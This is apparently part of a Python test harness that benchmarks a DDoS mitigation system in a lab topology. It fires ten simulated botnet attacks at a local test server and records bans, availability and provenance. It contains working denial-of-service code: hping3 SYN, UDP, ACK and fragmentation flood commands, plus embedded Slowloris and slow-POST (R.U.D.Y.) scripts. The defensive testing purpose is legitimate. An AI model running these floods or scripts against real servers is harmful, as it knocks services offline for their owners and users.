    capture_metrics("Distributed Low & Slow SYN", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=30, attack_start=attack_start, log_start_pos=log_pos)
    capture_metrics("Distributed Low & Slow SYN", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Distributed Low & Slow SYN", bans, botnet, legit)


def scenario_udp_flood(botnet, legit):
    """S3: Distributed high-rate UDP flood."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 3: Distributed UDP Flood")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed UDP Flood", "Phase 1: Baseline")
    attack_start = _attack_begin()
    log_pos = _get_log_size()
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"hping3 --udp -p 80 --flood {SERVER_IP}", ns=ns, bg=True))
    capture_metrics("Distributed UDP Flood", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=10, attack_start=attack_start, log_start_pos=log_pos)
    # ── Sustained Stress Window: measure CPU while bans actively DROP flood traffic ──
    print(f"    {CYAN}[*] Sustained stress measurement (10s)...{RESET}")
    for i in range(3):
        time.sleep(3)
        capture_metrics("Distributed UDP Flood", f"Phase 2A: Sustained Stress ({i+1}/3)")
    time.sleep(1)
    # ── End Sustained Stress ──
    capture_metrics("Distributed UDP Flood", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Distributed UDP Flood", bans, botnet, legit)


def scenario_http_flood(botnet, legit):
    """S4: Distributed HTTP flood: wrk, or the open-loop FLOOD_TOOL at FLOOD_RATE per bot."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 4: Distributed HTTP Flood")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed HTTP Flood", "Phase 1: Baseline")
    attack_start = _attack_begin()
    log_pos = _get_log_size()
    procs = launch_botnet(botnet, start_flood)
    flood_alive(procs, len(botnet))
    capture_metrics("Distributed HTTP Flood", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=15, attack_start=attack_start, log_start_pos=log_pos)
    capture_metrics("Distributed HTTP Flood", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Distributed HTTP Flood", bans, botnet, legit)


def scenario_ack_flood(botnet, legit):
    """S5: Distributed ACK flood (TCP state exhaustion)."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 5: Distributed ACK Flood")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed ACK Flood", "Phase 1: Baseline")
    attack_start = _attack_begin()
    log_pos = _get_log_size()
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"hping3 -A -p 80 --flood {SERVER_IP}", ns=ns, bg=True))
    capture_metrics("Distributed ACK Flood", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=10, attack_start=attack_start, log_start_pos=log_pos)
    # ── Sustained Stress Window: measure CPU while bans actively DROP flood traffic ──
    print(f"    {CYAN}[*] Sustained stress measurement (10s)...{RESET}")
    for i in range(3):
        time.sleep(3)
        capture_metrics("Distributed ACK Flood", f"Phase 2A: Sustained Stress ({i+1}/3)")
    time.sleep(1)
    # ── End Sustained Stress ──
    capture_metrics("Distributed ACK Flood", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Distributed ACK Flood", bans, botnet, legit)


def scenario_fragmentation(botnet, legit):
    """S6: Distributed IP fragmentation flood."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 6: Distributed IP Fragmentation Flood")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed IP Fragmentation Flood", "Phase 1: Baseline")
    attack_start = _attack_begin()
    log_pos = _get_log_size()
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"hping3 -S -p 80 -f --fragoff 20 --flood {SERVER_IP}",
            ns=ns, bg=True))
    capture_metrics("Distributed IP Fragmentation Flood", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=10, attack_start=attack_start, log_start_pos=log_pos)
    # ── Sustained Stress Window: measure CPU while bans actively DROP flood traffic ──
    print(f"    {CYAN}[*] Sustained stress measurement (10s)...{RESET}")
    for i in range(3):
        time.sleep(3)
        capture_metrics("Distributed IP Fragmentation Flood", f"Phase 2A: Sustained Stress ({i+1}/3)")
    time.sleep(1)
    # ── End Sustained Stress ──
    capture_metrics("Distributed IP Fragmentation Flood", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Distributed Fragmentation", bans, botnet, legit)


def scenario_slowloris(botnet, legit):
    """S7: Distributed Slowloris from all botnet nodes."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 7: Distributed Slowloris")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed Slowloris", "Phase 1: Baseline")
    attack_start = _attack_begin()
    log_pos = _get_log_size()
    script = "/tmp/_dist_slowloris.py"
    _write_script(script, f'''import socket, random, time
TARGET = "{SERVER_IP}"; PORT = 80; N = 8; SLEEP = 5; socks = []
def mk():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4); s.connect((TARGET, PORT))
        s.send(f"GET /?r={{random.randint(0,9999)}} HTTP/1.1\\r\\n".encode())
        s.send(f"Host: {{TARGET}}\\r\\n".encode())
        s.send("User-Agent: SL\\r\\nAccept-language: en\\r\\n".encode())
        return s
    except: return None
for _ in range(N):
    s = mk()
    if s: socks.append(s)
while True:
    for s in list(socks):
        try: s.send(f"X-a: {{random.randint(1,9999)}}\\r\\n".encode())
        except: socks.remove(s)
    for _ in range(N - len(socks)):
        s = mk()
        if s: socks.append(s)
    time.sleep(SLEEP)
''')
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"python3 {script}", ns=ns, bg=True))
    capture_metrics("Distributed Slowloris", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=40, attack_start=attack_start, log_start_pos=log_pos)
    capture_metrics("Distributed Slowloris", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Distributed Slowloris", bans, botnet, legit)


def scenario_rudy(botnet, legit):
    """S8: Distributed R.U.D.Y. (Slow POST) from all botnet nodes."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 8: Distributed R.U.D.Y. (Slow POST)")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed R.U.D.Y.", "Phase 1: Baseline")
    attack_start = _attack_begin()
    log_pos = _get_log_size()
    script = "/tmp/_dist_rudy.py"
    _write_script(script, f'''import socket, random, time
TARGET = "{SERVER_IP}"; PORT = 80; N = 10; SLEEP = 7; socks = []
def mk():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4); s.connect((TARGET, PORT))
        s.send(f"POST /?r={{random.randint(0,9999)}} HTTP/1.1\\r\\n".encode())
        s.send(f"Host: {{TARGET}}\\r\\n".encode())
        s.send("User-Agent: RD\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n".encode())
        s.send("Content-Length: 1000000\\r\\nConnection: keep-alive\\r\\n\\r\\n".encode())
        return s
    except: return None
for _ in range(N):
    s = mk()
    if s: socks.append(s)
while True:
    for s in list(socks):
        try: s.send(b"a")
        except: socks.remove(s)
    for _ in range(N - len(socks)):
        s = mk()
        if s: socks.append(s)
    time.sleep(SLEEP)
''')
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"python3 {script}", ns=ns, bg=True))
    capture_metrics("Distributed R.U.D.Y.", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=40, attack_start=attack_start, log_start_pos=log_pos)
    capture_metrics("Distributed R.U.D.Y.", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Distributed R.U.D.Y.", bans, botnet, legit)


def scenario_yoyo(botnet, legit):
    """S9: Distributed Yo-Yo (pulsing) attack."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 9: Distributed Yo-Yo (Pulsing) Attack")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed Yo-Yo", "Phase 1: Baseline")
    attack_start = _attack_begin()
    log_pos = _get_log_size()
    script = "/tmp/_dist_yoyo.sh"
    _write_script(script, f"""#!/bin/bash
while true; do
    wrk -t{WRK_THREADS} -c{WRK_CONNS} -d2s {HTTP_URL} > /dev/null 2>&1
    sleep 6
done
""")
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"bash {script}", ns=ns, bg=True))
    capture_metrics("Distributed Yo-Yo", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=25, attack_start=attack_start, log_start_pos=log_pos)
    capture_metrics("Distributed Yo-Yo", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Distributed Yo-Yo", bans, botnet, legit)


def scenario_multi_vector(botnet, legit):
    """S10: Multi-vector: bots split across SYN, HTTP, and UDP attacks."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 10: Multi-Vector Distributed Attack")
    print(f"{'='*70}{RESET}")
    capture_metrics("Multi-Vector Distributed Attack", "Phase 1: Baseline")
    attack_start = _attack_begin()
    log_pos = _get_log_size()
    procs = []
    n = len(botnet)
    third = n // 3

    for ns, ip in botnet[:third]:
        p = run(f"hping3 -S -p 80 -i u1000 {SERVER_IP}", ns=ns, bg=True)
        if p: procs.append((p, ns, ip))

    for ns, ip in botnet[third:2*third]:
        p = run(f"wrk -t{WRK_THREADS} -c{WRK_CONNS} -d{_wrk_seconds()}s {HTTP_URL}", ns=ns, bg=True)
        if p: procs.append((p, ns, ip))

    for ns, ip in botnet[2*third:]:
        p = run(f"hping3 --udp -p 80 --flood {SERVER_IP}", ns=ns, bg=True)
        if p: procs.append((p, ns, ip))

    capture_metrics("Multi-Vector Distributed Attack", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=20, attack_start=attack_start, log_start_pos=log_pos)
    # ── Sustained Stress Window: measure CPU while bans actively DROP flood traffic ──
    print(f"    {CYAN}[*] Sustained stress measurement (10s)...{RESET}")
    for i in range(3):
        time.sleep(3)
        capture_metrics("Multi-Vector Distributed Attack", f"Phase 2A: Sustained Stress ({i+1}/3)")
    time.sleep(1)
    # ── End Sustained Stress ──
    capture_metrics("Multi-Vector Distributed Attack", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Multi-Vector Attack", bans, botnet, legit)


# ═══════════════════════════════════════════════════════════════════════════════
#  RESULTS DIRECTORY & PROVENANCE
# ═══════════════════════════════════════════════════════════════════════════════

_PROVENANCE_INPUTS = ["test_distributed_suite.py", "control_plane.py", "ban_events.py",
                      "xdp_ddos_filter.c", "GRU_ML_model.py", "nginx.conf",
                      "nginx_unprotected.conf", "training_results/feature_config_testbed.json"]


def _utc_now():
    return datetime.datetime.now(datetime.UTC).isoformat(timespec="seconds")


def _git(*args):
    """git output for the project, or None. The suite runs as root on a user-owned
    repository, so it is marked safe for this call only (no git config is changed)."""
    try:
        r = subprocess.run(["git", "-c", f"safe.directory={PROJECT_DIR}", "-C", PROJECT_DIR,
                            *args], capture_output=True, text=True, timeout=10, check=False)
    except (OSError, subprocess.SubprocessError):
        return None
    return r.stdout.strip() if r.returncode == 0 else None


def _init_results_dir():
    """Create this run's results directory; refuse one that already holds a run."""
    global _results_dir, _run_started_utc
    _run_started_utc = _utc_now()
    d = os.environ.get("RESULTS_DIR") or os.path.join(
        RESULTS_ROOT, time.strftime("%Y%m%dT%H%M%SZ", time.gmtime()) + "_" + _mode_label())
    if os.path.exists(os.path.join(d, "provenance.json")):
        print(f"{RED}[-] {d} already holds a run (provenance.json); use a new RESULTS_DIR.{RESET}")
        sys.exit(2)
    os.makedirs(d, exist_ok=True)
    _results_dir = d


def _write_provenance(status):
    """(Re)write <results_dir>/provenance.json — code, settings and host of this run —
    so every result traces back to an exact commit and configuration (review F-24)."""
    if not _results_dir:
        return
    files = list(_PROVENANCE_INPUTS)
    if FLOOD_TOOL != "wrk":
        files += ["bench/loadtools.py", "bench/loadtools.json", "bench/loadgen.py"]
    try:
        with open(os.path.join(PROJECT_DIR, "training_results/feature_config_testbed.json")) as f:
            gru_cfg = json.load(f)
        files += [p for p in (gru_cfg.get("model"), gru_cfg.get("scaler")) if p]
    except (OSError, ValueError):
        pass
    dirty = _git("status", "--porcelain", "--untracked-files=no")
    try:
        nginx_v = subprocess.run(["nginx", "-v"], capture_output=True, text=True,
                                 timeout=5, check=False).stderr.strip()
    except (OSError, subprocess.SubprocessError):
        nginx_v = None
    prov = {
        "schema": 1,
        "run_id": os.path.basename(os.path.normpath(_results_dir)),
        "status": status,
        "started_utc": _run_started_utc,
        "updated_utc": _utc_now(),
        "argv": sys.argv,
        "git": {"commit": _git("rev-parse", "HEAD"),
                "branch": _git("rev-parse", "--abbrev-ref", "HEAD"),
                "dirty": None if dirty is None else bool(dirty),
                "dirty_files": dirty.splitlines()[:50] if dirty else []},
        "mode": {"label": _mode_label(),
                 "MITIGATION_MODE": os.environ.get("MITIGATION_MODE", "active"),
                 "MITIGATION_BACKEND": os.environ.get("MITIGATION_BACKEND", "xdp"),
                 "NGINX_PROTECTED": NGINX_PROTECTED,
                 "GRU_ONLY": os.environ.get("GRU_ONLY", "0") == "1",
                 "nginx_conf": os.path.basename(_nginx_conf())},
        "operating_point": {"name": OPERATING_POINT, **_OP},
        "settings": {"ATTACK_DURATION": ATTACK_DURATION, "PROFILE_SEED": PROFILE_SEED,
                     "FLOOD_TOOL": FLOOD_TOOL, "FLOOD_RATE": FLOOD_RATE,
                     "ONLY_SCENARIOS": os.environ.get("ONLY_SCENARIOS", ""),
                     "LEGIT_COUNT": LEGIT_COUNT, "BOTNET_COUNT": BOTNET_COUNT,
                     "AVAIL_BEFORE_SECONDS": AVAIL_BEFORE_SECONDS,
                     "AVAIL_AFTER_SECONDS": AVAIL_AFTER_SECONDS},
        "profile_plan": [{"ip": ip, "profile": prof} for ip, prof in _profile_plan],
        "host": {"uname": " ".join(platform.uname()), "cpus": os.cpu_count(),
                 "python": sys.version.split()[0], "nginx": nginx_v},
        "inputs_sha256": {f: ban_events.file_sha256(os.path.join(PROJECT_DIR, f)) for f in files},
    }
    if FLOOD_TOOL != "wrk":
        prov["flood"] = _flood_provenance()
    path = os.path.join(_results_dir, "provenance.json")
    with open(path + ".tmp", "w") as f:
        json.dump(prov, f, indent=1)
        f.write("\n")
    os.replace(path + ".tmp", path)


def _flood_provenance():
    """The open-loop flood of this run: tool, per-bot rate, the settings it runs with and the
    manifest entry that cleared it (scenario 4 only; the other scenarios keep wrk)."""
    out = {"tool": FLOOD_TOOL, "rate_per_bot": FLOOD_RATE, "bots": BOTNET_COUNT, "scenario": 4,
           "nofile": FLOOD_NOFILE, "timeout_s": 10.0}
    try:
        lt = _loadtools()
        entry = lt.load_manifest()["tools"][FLOOD_TOOL]
        out["limits"] = lt.limits_for(FLOOD_TOOL, FLOOD_RATE)
        out["manifest"] = {k: entry.get(k) for k in ("version", "sha256", "status")}
    except (OSError, ValueError, KeyError, RuntimeError) as exc:
        out["error"] = str(exc)
    return out


def _chown_results():
    """Hand the results directory to the user who ran sudo, so it can be analysed
    and published without root."""
    uid, gid = os.environ.get("SUDO_UID"), os.environ.get("SUDO_GID")
    if not (_results_dir and uid and gid):
        return
    for root, dirs, files in os.walk(_results_dir):
        for path in [root] + [os.path.join(root, n) for n in dirs + files]:
            try:
                os.chown(path, int(uid), int(gid))
            except OSError:
                pass


def _finish_run():
    """Close the results directory: archive the daemon log, final provenance, ownership.
    Called at the end of main() and, via atexit, after an abnormal exit (idempotent)."""
    global _run_finished
    if _run_finished or not _results_dir:
        return
    _run_finished = True
    _archive_daemon_log()
    _write_provenance(_run_status)
    _chown_results()


# ═══════════════════════════════════════════════════════════════════════════════
#  FINAL SUMMARY
# ═══════════════════════════════════════════════════════════════════════════════

def print_summary():
    print(f"\n{BOLD}{YELLOW}{'='*90}")
    print(f"  DISTRIBUTED TEST SUMMARY")
    print(f"{'='*90}{RESET}")
    hdr = (f"  {'Scenario':<35} | {'Banned':<10} | {'Avg TTM':<10} | "
           f"{'Engine(s)':<18} | {'FP':<8} | {'Result'}")
    print(hdr)
    print(f"  {'-'*88}")

    p = f = 0
    for r in results:
        c = GREEN if r["result"] == "PASS" else RED
        print(f"  {r['scenario']:<35} | {r['banned']:<10} | "
              f"{r['avg_ttm']:<10} | {r['engines']:<18} | "
              f"{r['fp']:<8} | {c}{r['result']}{RESET}")
        if r["result"] == "PASS":
            p += 1
        else:
            f += 1

    print(f"\n  {GREEN}Passed: {p}{RESET}  |  {RED}Failed: {f}{RESET}  |  "
          f"Total: {p + f}")

    # ── Service availability (legitimate clients, continuous) ──────────────────
    if _avail_results:
        print(f"\n{BOLD}{YELLOW}{'='*94}")
        print(f"  SERVICE AVAILABILITY (legitimate clients, continuous — before/during/after)")
        print(f"{'='*94}{RESET}")
        print(f"  {'Scenario':<32} | {'Period':<6} | {'Succ%':<6} | {'Reqs':<5} | "
              f"{'p50':<7} | {'p95':<7} | {'p99':<7} | {'TOs'}")
        print(f"  {'-'*92}")
        for r in _avail_results:
            for i, per in enumerate(("before", "during", "after")):
                k = r["by_period"][per]
                name = (r["scenario"][:32]) if i == 0 else ""
                if k["total"]:
                    col = GREEN if k["succ"] >= 99.0 else (YELLOW if k["succ"] >= 90.0 else RED)
                    succ = f"{col}{k['succ']:>5.1f}{RESET}"
                    lat = f"{k['p50']:>4.0f}ms | {k['p95']:>4.0f}ms | {k['p99']:>4.0f}ms"
                    print(f"  {name:<32} | {per:<6} | {succ} | {k['total']:<5} | "
                          f"{lat} | {k['c000']}")
                else:
                    print(f"  {name:<32} | {per:<6} | {'n/a':<6} | {0:<5} | "
                          f"{'—':<7} | {'—':<7} | {'—':<7} | 0")
        print(f"\n  {CYAN}Availability CSVs: /tmp/availability_<performance|iptables|nginxlimits|"
              f"unprotected>.csv (+ _raw_ per-request dumps){RESET}")
    if _results_dir:
        print(f"  {CYAN}Results directory (this run, with ban events + provenance): "
              f"{_results_dir}{RESET}")


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    global _profile_plan, _run_status
    if os.geteuid() != 0:
        print(f"{RED}[-] This script requires root privileges (sudo).{RESET}")
        sys.exit(1)
    # venv/ is untracked, so a fresh checkout or worktree has none; without this check
    # gunicorn and the daemon would only fail once the topology is up.
    if not os.access(PYTHON_VENV, os.X_OK):
        print(f"{RED}[-] No Python venv at {PYTHON_VENV} (gunicorn and control_plane.py run "
              f"from it). Create venv/ in this checkout or symlink an existing one.{RESET}")
        sys.exit(1)

    if problem := flood_preflight():
        print(f"{RED}[-] {problem}{RESET}")
        sys.exit(1)

    _init_results_dir()
    atexit.register(_finish_run)   # also after an abnormal exit; runs before cleanup_all (LIFO)
    _write_provenance("running")

    # Dependency check
    for tool in ["hping3", "wrk", "curl", "ping", "tc", "ip", "ethtool"]:
        r = run(f"which {tool}")
        if r is None or r.returncode != 0:
            print(f"{YELLOW}[!] Warning: '{tool}' not found. "
                  f"Some tests may fail.{RESET}")

    print(f"\n{BOLD}{CYAN}"
          f"╔══════════════════════════════════════════════════════════════╗\n"
          f"║   DISTRIBUTED DDoS MITIGATION TESTING SUITE                ║\n"
          f"║   {LEGIT_COUNT} Legit Clients  |  {BOTNET_COUNT} Botnet Nodes"
          f"                      ║\n"
          f"╚══════════════════════════════════════════════════════════════╝"
          f"{RESET}\n")
    print(f"{CYAN}[*] Mode: {_mode_label()} · operating point: {OPERATING_POINT} · "
          f"PROFILE_SEED={PROFILE_SEED}"
          f"{f' · ATTACK_DURATION={ATTACK_DURATION:g}s' if ATTACK_DURATION > 0 else ''}{RESET}")
    if FLOOD_TOOL != "wrk":
        print(f"{CYAN}[*] HTTP flood (scenario 4 only): {FLOOD_TOOL}, open-loop, "
              f"{FLOOD_RATE:g} requests/s per bot{RESET}")
    print(f"{CYAN}[*] Results directory: {_results_dir}{RESET}")

    legit, botnet = build_topology()
    _profile_plan = [(ip, prof) for _, ip, prof in legit]
    _write_provenance("running")
    start_legit_traffic(legit)

    print(f"\n{CYAN}[*] Baseline settling period (5s)...{RESET}")
    time.sleep(5)

    # Ordered scenario registry. ONLY_SCENARIOS="4,7,8,9" (env) runs a subset in
    # this same order; unset → all ten, exactly as before (resets between each).
    all_scenarios = [
        (1, scenario_syn_flood), (2, scenario_slow_syn), (3, scenario_udp_flood),
        (4, scenario_http_flood), (5, scenario_ack_flood), (6, scenario_fragmentation),
        (7, scenario_slowloris), (8, scenario_rudy), (9, scenario_yoyo),
        (10, scenario_multi_vector),
    ]
    only = os.environ.get("ONLY_SCENARIOS", "").strip()
    if only:
        want = {int(x) for x in only.split(",") if x.strip()}
        run_list = [(n, fn) for n, fn in all_scenarios if n in want]
        print(f"{YELLOW}[!] ONLY_SCENARIOS={only} → running scenarios "
              f"{[n for n, _ in run_list]}{RESET}")
    else:
        run_list = all_scenarios

    try:
        for i, (_n, fn) in enumerate(run_list):
            fn(botnet, legit)
            if i < len(run_list) - 1:
                reset_between_scenarios()
        _run_status = "completed"
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrupted by user.{RESET}")
    finally:
        stop_legit_traffic()

    print_summary()
    _finish_run()


if __name__ == "__main__":
    main()
